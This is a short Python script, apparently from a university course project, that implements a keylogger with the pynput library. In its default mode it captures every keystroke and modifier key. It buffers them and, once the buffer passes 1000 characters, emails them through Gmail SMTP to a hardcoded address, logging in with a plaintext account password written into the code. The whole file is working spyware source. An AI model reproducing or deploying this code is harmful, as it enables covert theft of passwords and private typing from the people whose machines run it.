from pynput import keyboard
import time
import smtplib

def on_press(key):
    print(key)
    if(local):
        try:
            f.write('{0}\n'.format(
                key.char))
            #if(key.char == '`'):
            #    keyboard.Listener.stop
        except AttributeError:
            f.write('{0}\n'.format(
                key))
    else:
        global data
        try:
            data += str(key.char) + '\n'
        except AttributeError:
            data += str(key) + '\n'
        finally:
            if(len(data) > maxDataLen):
                send_data()

def on_release(key):
    if(local):
        if(str(key) in holdDowns):
            f.write('{0} Released\n'.format(
                key))
    else:
        global data
        if(str(key) in holdDowns):
            data += str(key) + ' released\n'
        if(len(data) > maxDataLen):
            send_data()
    if(key == keyboard.Key.esc):
        #stop listener
        return False

def send_data():
    global data
    print('sending data')
    try:
        msg = data
        server.sendmail("keylogsenderUIUC460@gmail.com", destEmail, msg)
        data='' #reset data
    except Exception as e:
        print('Exception: ' + str(e))

def run_keylogger():
    #collect events until released
    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release
            ) as listener:

        print("joining")
        listener.join()
        print("joined")

holdDowns = ['Key.ctrl_l', 'Key.ctrl_r',
             'Key.shift', 'Key.shift_r',
             'Key.alt_l', 'Key.alt_r']

local = False
destEmail = 'kchang33@illinois.edu'
if(local):
    f = open('keylog.txt', 'w')
else:
    data = ''
    maxDataLen = 1000 #max length for data before sending
    #set up smtp server
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login("keylogsenderUIUC460", "qazwsxedcrfv")
run_keylogger()
if(local):
    f.close()
else:
    server.quit()
